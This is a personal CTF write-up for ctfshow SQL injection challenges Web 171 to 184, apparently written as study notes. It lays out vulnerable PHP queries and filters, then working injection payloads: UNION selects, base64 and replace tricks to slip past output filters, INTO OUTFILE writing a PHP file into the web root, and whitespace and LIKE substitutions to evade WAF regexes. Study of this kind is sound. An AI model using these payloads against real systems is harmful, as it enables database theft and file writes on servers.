# Web 171
![[Pasted image 20241214102338.png]]
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

```SQL
select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;
```
## Observation
PHP code is : `$sql = "xxxxx".$_GET['id']."yyyy"`
- `xxxxx`: `select username,password from user where username !='flag' and id = '`
- `yyyy`: `' limit 1; `
When we do search in this page:
- If username is not flag, and the user ID is not what we provide, the records will be displayed.
- Limit will be executed at last.
## Research

This is a typical ==string== **SQL Injection**.
- Try to use `'` to match the `'` in the string before `$_GET['id']`, so we use `{number}'`.
- Then we also need to match the `'` in the string after `$_GET['id']`, so we use `or username = 'flag`
## Experiment
![[Pasted image 20241216201104.png]]

**Why `limit 1` is invalid?** 
Guess:
- 在分布式数据库（如某些 MySQL 集群版本）中，`LIMIT` 的应用可能被推迟到查询的最终合并阶段，导致在本地节点看到多条记录。
- 某些数据库引擎（如 MySQL）可能会因为缓存问题返回过多的记录。这种情况在高并发查询时容易发生。

# Web 172
![[Pasted image 20241218062030.png]]
Use the same trick, the password says: `flag_not_here`.
![[Pasted image 20241218062133.png]]
## Observation
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
But the returning logic:
```PHP
//检查结果是否有flag
if($row->username!=='flag'){
  $ret['msg']='查询成功';
}
```
This filters the record whose username is "flag".
## Research
So we need to avoid this filter by using Base64 coding.
### `TO_BASE64()` Method in MySQL
In the standard SQL, there is no Base64 encoding method.
However, there is `TO_BASE64()` method in MySQL and `encode()` in PostgreSQL.
### UNION SQL Injection
When in string SQL injection point, we also can use UNION method.
- Close the `'` before;
- then follow a new `SELECT` with `UNION`.
## Experiment
use:
```SQL
1' union select to_base64(username), to_base64(password) from ctfshow_user2 where username = 'flag' -- 
```
![[Pasted image 20241218063217.png]]
We can decode the password.

![[Pasted image 20241218064420.png]]

## Another Way
```SQL
select username, password from ctfshow_user2 where username != 'flag' and id = '9999' union select username, password from ctfshow_user2 where username = 'flag' limit 1;
```
to
```SQL
select username, password from ctfshow_user2 where username != 'flag' and id = '9999' union select id, password from ctfshow_user2 where username = 'flag' limit 1;
```

Change username to ID, so that avoiding the condition.

![[Pasted image 20241219064028.png]]
# Web 173
![[Pasted image 20241219064644.png]]
## Observation
```PHP
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
The condition of returning is:
```PHP
//检查结果是否有flag
if(!preg_match('/flag/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```
## Analysis
If we don't show the username in the returning record, the condition can be avoided.
[[#Another Way]]
```SQL
select id, username, password from ctfshow_user3 where username != 'flag' and id = '999' union select id, id, password from ctfshow_user3 where username = 'flag' limit 1;
```
## Experiment
Local Test:
![[Pasted image 20241219065519.png]]
The real test:
![[Pasted image 20241219065623.png]]

# Web 174
## Observation
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
The SQL in it is:
```SQL
select id, username, password from ctfshow_user4 where username != 'flag' and id = '???' limit 1;
```
 Condition:
```PHP
//检查结果是否有flag
if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```
The return records cannot include numbers.
## Research
### `json_encode`
In PHP
`json_encode()` convert PHP variables to JSON strings.
#### 数据序列化
In PHP, the datatype, such as array, object, string, numbers, boolean, etc.
convert JSON format strings, so that the strings can transmit or store among different systems or apps.
e.g.:
```php
$data = array('name' => 'John', 'age' => 30, 'city' => 'New York'); $jsonData = json_encode($data); echo $jsonData; 
``` 
The code above convert an array to JSON strings:
`{"name":"John","age":"30","city":"New York"}`
#### Interaction with JavaScript
JSON is the common data format in JavaScript.
```php
<?php 
$data = array('message' => 'Hello from PHP!'); 
$jsonData = json_encode($data); 
?> 
<script> 
var data = <?php echo $jsonData;?>; 
console.log(data.message); 
</script> 
``` 
#### API Development
When developing Web API, we need to convert data to JSON data to return message to client.
`json_encode()` can convert PHP data into JSON format, so that the client can analyze it and explain it.
#### Data Storage
JSON format strings can be stored in Dataset or Files.
When we access the strings, we can use corresponding function to convert JSON strings back to PHP data type.
## Hypothesis
- `to_base64` may also include numbers.
- A stupid solution is to replace the numbers with the signs in numeric area of keyboard. (A long replace code in SQL.)
	- `1->!`
	- `2->@`
	- `3->#`
	- ...
## Experiment
### Local Test
#### `replace`
![[Pasted image 20241221094901.png]]
![[Pasted image 20241221094942.png]]
#### Try Locally
```SQL
select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag' limit 1;
```
![[Pasted image 20241221102227.png]]
```
mysql> select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', password from ctfshow_user4 where username = 'flag' limit 1;

+----+----------+------------+

| id | username | password |

+----+----------+------------+

| a | AAAA | a1b2c3d4e5 |

+----+----------+------------+

1 row in set (0.01 sec)
```

```
mysql> select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag' limit 1;

+----+----------+------------+

| id | username | password |

+----+----------+------------+

| a | AAAA | a!b@c#d$e% |

+----+----------+------------+

1 row in set (0.01 sec)
```
#### Try Online
![[Pasted image 20241221103330.png]]
When we use the completed code to execute searching, we can't get the result:
```
999' union select 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag
```
![[Pasted image 20241221105315.png]]
We can decode the URL code:
![[Pasted image 20241221105418.png]]
It's not completed!!!!
So we need BurpSuite to send the completed command.
![[Pasted image 20241221105534.png]]
![[Pasted image 20241221105605.png]]
Okay, we got it!
![[Pasted image 20241221105631.png]]
Then the flag is as follows:
```
ctfshow{^df$e^^c-$$$^-$d)(-(#e^-!e!)!bd*!bc$}"}
```
Then we need to replace the characters:
```
ctfshow{6df4e66c-4446-4d09-93e6-1e101bd81bc4}
```
# Web 175
![[Pasted image 20241225073835.png]]
## Observation
Searching Sentence:
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user5 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
SQL part:
```SQL
select username, password from ctfshow_user5 where username != 'flag' and id = '????' limit 1;
```
Return Logic:
```PHP
//检查结果是否有flag
if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```
## Analysis
The returned result can't be the numbers from 0 to $7\times16^1 + 15$.
## Hypothesis
We still can use `replace`.
![[Pasted image 20241225075416.png]]
Invalid.
## Research
- `[\x00-\x7f]` : The expression describes a set of characters. `\x00` means `NULL`, `\x7f` means `DELETE`. The set include the whole ASCII character set.
- `/i` : this means the Regular Expression is case-insensitive.
## Hypothesis
Nothing can be returned when the PHP code uses the function `preg_match`.
So we only can output the records to file.
### `into outfile` in `MySQL`
MySQL offers `INTO OUTFILE`, which can write the records we have researched into files in servers.
```SQL
SELECT * FROM your_table INTO OUTFILE '/path/to/output.txt'
```
Note: If we use `INTO OUTFILE`, we need writing rights of the files firstly.
## Experiment
```
select username, password from ctfshow_user5 where username != 'flag' and id = '999' union select username, password from ctfshow_user5 into outfile '/var/www/html/flag1.php' # 'limit 1;
```
![[Pasted image 20241225151726.png]]
![[Pasted image 20241225151747.png]]
![[Pasted image 20241225151818.png]]
Note: I recommend that we use Burp Suite to track what we have sent to Server.
If we directly use the input component to input the `#` at the tail of our command, the `%23` will be ignored in the GET request.

# Web 176
```PHP
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

```SQL
select id,username,password from ctfshow_user where username !='flag' and id = '???' limit 1;
```

## Solution
- close the `id='`
	- `id='999'`
- find the target with `username='flag'`
```SQL
select id, username, password from ctfshow_user where username != 'flag' and id = '999' or username = 'flag' limit 1;
```
![[Pasted image 20250124090506.png]]
# Web 177
```SQL
select id,username,password from ctfshow_user where username !='flag' and id = '???' limit 1;
```
But:
![[Pasted image 20250124091332.png]]
The filter works.
- Firstly, try to remove all space.
	- `999'or%0busername='flag`
	- `%0b` means new line or Enter.
![[Pasted image 20250124093259.png]]
# Web 178
Same as [[#Web 177]]
- Firstly, try to remove all space.
	- `999'or%0busername='flag`
	- `%0b` means new line or Enter.
![[Pasted image 20250124102029.png]]
# Web 179
The solutions of [[#Web 178]] & [[#Web 177]] do not work.
We need to look up the [ASCII table](https://baike.baidu.com/item/ASCII/309296?fr=aladdin):
![[Pasted image 20250124104943.png]]
We can find that `0x0c` works well:
![[Pasted image 20250124105018.png]]
![[Pasted image 20250124105151.png]]
# Web 180
![[Pasted image 20250126085712.png]]
This means `%0c` still works.
![[Pasted image 20250126090551.png]]
```
999'%0cunion%0cselect'1','2',password%0cfrom%0cctfshow_user%0cwhere%0cusername='flag
```
# Web 181
```SQL
select id,username,password from ctfshow_user where username !='flag' and id = '???' limit 1;
```

```PHP
//对传入的参数进行了过滤
function waf($str){
	return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
}
```
`\x0c` and `select` are forbidden.

```
￼￼\x0c￼￼ and ￼￼select￼￼ are forbidden.
在PHP字符串中，这些转义字符和特殊字符的含义如下：

1. `\x09`：水平制表符（Tab），ASCII值为9。
2. `\x0a`：换行符（Line Feed），ASCII值为10。
3. `\x0b`：垂直制表符（Vertical Tab），ASCII值为11。
4. `\x0c`：换页符（Form Feed），ASCII值为12。
5. `\x00`：空字符（Null），ASCII值为0。
6. `\x0d`：回车符（Carriage Return），ASCII值为13。
7. `\xa0`：非换行空格（Non-breaking Space），ASCII值为160。
8. `\x23`：井号（#），ASCII值为35。

这些字符通常用于控制文本格式或表示特殊字符。

But there is no restriction for `%0c` instead of `\x0c`:
```PHP
999'or%0cusername='flag
```
![[Pasted image 20250205100558.png]]
## `%0c` is not equal with `\0xc`
你的代码无法匹配 `%0c` 的原因是 `%0c` 是 URL 编码形式的字符，而你的正则表达式直接匹配的是字符本身（如 `\x0c`），而不是 URL 编码后的形式。

### 问题分析
1. **`%0c` 的含义**：
   - `%0c` 是 URL 编码，对应的字符是 `\x0c`（换页符）。
   - 如果你的输入字符串是 `%0c`，它会被 PHP 当作字面字符串 `%0c` 处理，而不是直接解析为 `\x0c` 字符。

2. **正则表达式的匹配**：
   - 你的正则表达式 `/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i` 直接匹配字符（如 `\x0c`），而不是 URL 编码后的形式（如 `%0c`）。
   - 因此，如果输入是 `%0c`，正则表达式无法匹配到它。

---

### 解决方法
如果你希望匹配 URL 编码形式的字符（如 `%0c`），需要对输入字符串进行 URL 解码（`urldecode`），然后再进行匹配。

修改后的代码如下：

```php
function waf($str) {
    // 先对输入字符串进行 URL 解码
    $decodedStr = urldecode($str);
    // 匹配特殊字符或关键词
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $decodedStr);
}
```

---

### 测试示例
```php
$input = "%0c"; // 输入是 %0c
if (waf($input)) {
    echo "匹配成功！";
} else {
    echo "匹配失败！";
}
```

**输出**：
```
匹配成功！
```

---

### 总结
- `%0c` 是 URL 编码形式，需要先解码为 `\x0c`，才能被正则表达式匹配。
- 使用 `urldecode` 函数对输入字符串进行解码，然后再进行匹配即可解决问题。

# Web 182
```PHP
//对传入的参数进行了过滤
function waf($str){
	return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
}
```
The same SQL command, but one more filter, that is `flag`.
So we need to use a keyword: `like`.
```
999' or username like '%fla%
```
Convert to:
```
999'or%0cusername%0clike'fla_
```
![[Pasted image 20250205104020.png]]
## 模糊匹配 in SQL
SQL 中的模糊匹配是一种用于在数据库中查找符合特定模式的数据的技术。它通常用于 `WHERE` 子句中，结合 `LIKE` 操作符和通配符来实现。以下是模糊匹配的核心概念：

---

### 1. **`LIKE` 操作符**
`LIKE` 是 SQL 中用于模糊匹配的关键字。它允许你使用通配符来匹配字符串中的部分内容。

---

### 2. **通配符**
SQL 模糊匹配中常用的通配符有两个：
- **`%`**：匹配任意长度的字符（包括零个字符）。
  - 示例：`'a%'` 匹配以 `a` 开头的任意字符串（如 `apple`、`abc`）。
  - 示例：`'%a'` 匹配以 `a` 结尾的任意字符串（如 `banana`、`data`）。
  - 示例：`'%a%'` 匹配包含 `a` 的任意字符串（如 `cat`、`grape`）。

- **`_`**：匹配单个字符。
  - 示例：`'a_'` 匹配以 `a` 开头且长度为 2 的字符串（如 `at`、`an`）。
  - 示例：`'_a'` 匹配以 `a` 结尾且长度为 2 的字符串（如 `ba`、`ma`）。

---

### 3. **示例**
假设有一个表 `users`，其中有一列 `name`，数据如下：

| id  | name      |
|-----|-----------|
| 1   | Alice     |
| 2   | Bob       |
| 3   | Charlie   |
| 4   | David     |
| 5   | Eva       |

- **查找以 `A` 开头的名字**：
  ```sql
  SELECT * FROM users WHERE name LIKE 'A%';
  ```
  结果：`Alice`

- **查找包含 `a` 的名字**：
  ```sql
  SELECT * FROM users WHERE name LIKE '%a%';
  ```
  结果：`Alice`、`Charlie`、`David`、`Eva`

- **查找第二个字符是 `o` 的名字**：
  ```sql
  SELECT * FROM users WHERE name LIKE '_o%';
  ```
  结果：`Bob`

---

### 4. **注意事项**
- 模糊匹配的性能通常比精确匹配（如 `=`）差，尤其是在大数据集上。
- 如果需要进行更复杂的模式匹配，可以使用正则表达式（如 MySQL 中的 `REGEXP`）。

---

### 总结
SQL 中的模糊匹配通过 `LIKE` 操作符和通配符（`%` 和 `_`）实现，适合查找符合特定模式的字符串。
# Web 183
SQL part:
```PHP
//拼接sql语句查找指定ID用户
$sql = "select count(pass) from ".$_POST['tableName'].";";
```
Filters:
```PHP
//对传入的参数进行了过滤
function waf($str){
	return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
}
```
SQL result:
```PHP
//返回用户表的记录总数
$user_count = 0;
```
The following result indicates that the table 'ctfshow_user' exists:
![[Pasted image 20250205105651.png]]
The key we query is not 'username' but 'pass' as password column name:
```SQL
select count(pass) from `ctfshow_user`where`pass`like'%ctfshow{%'
```
- We can't use spaces so we use a pair of anti-quotes to replace 2 spaces.
- Before execute the hack bar, we need to URL encode the `'%ctfshow{%'` to `'%25ctfshow%7B%25'`.
![[Pasted image 20250205111501.png]]
Yes, there is 1 pass including `ctfshow{` in its own string.
Then we need to try every character to 
![[Pasted image 20250208084705.png]]
```plaintext
ctfshow{0bde24ed-c281-4013-a955-12fe8c846212}
```
# Web 184
SQL part:
```SQL
select count(*) from ".$_POST['tableName'].";
```
